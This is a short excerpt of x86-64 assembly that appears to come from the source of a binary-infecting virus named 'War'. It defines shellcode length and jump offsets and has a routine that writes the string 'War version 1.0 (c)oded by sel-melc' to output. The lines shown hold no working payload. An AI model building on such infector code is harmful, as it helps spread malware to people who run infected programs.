...
%define SHELLCODE_LEN 7184 ; 44 + 5 (jmp) + 12 (exit) + signature (38) + fingerprint (116)
%define SHELLCODE_JMP_INDEX 7018; 44 + 5 (jmp)
%define PURE_SHELLCODE_LEN 7013 
...
write_signature:
	mov rax, 0x0000202d20636c65
	push rax
	mov rax, 0x6d2d6c6573207962
	push rax
	mov rax, 0x206465646f296328
	push rax
	mov rax, 0x20302e31206e6f69
	push rax
	mov rax, 0x7372657620726157
	push rax
	mov rsi, rsp
	mov rax, 1
	mov rdx, 38
